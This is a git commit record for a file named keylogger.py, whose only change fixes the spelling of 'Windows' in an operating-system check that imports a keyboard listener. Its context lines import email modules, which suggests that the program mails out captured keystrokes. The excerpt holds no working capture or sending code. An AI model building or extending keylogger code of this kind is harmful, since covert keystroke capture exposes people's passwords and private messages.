4c6e779d70c67b3b4dce91d08a2438b918fb2203
TRS5887 <47867979+TRS5887@users.noreply.github.com>
2019-04-05 21:00:17 -0400

    Add files via upload
    Fixed spelling issue

--- keylogger.py
+++ keylogger.py
@@ -52,7 +52,7 @@ from email import encoders
 from email.mime.base import MIMEBase
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-if mySystem == ('Windoes'):
+if mySystem == ('Windows'):
    from pynput.keyboard import Key, Listener
 
 
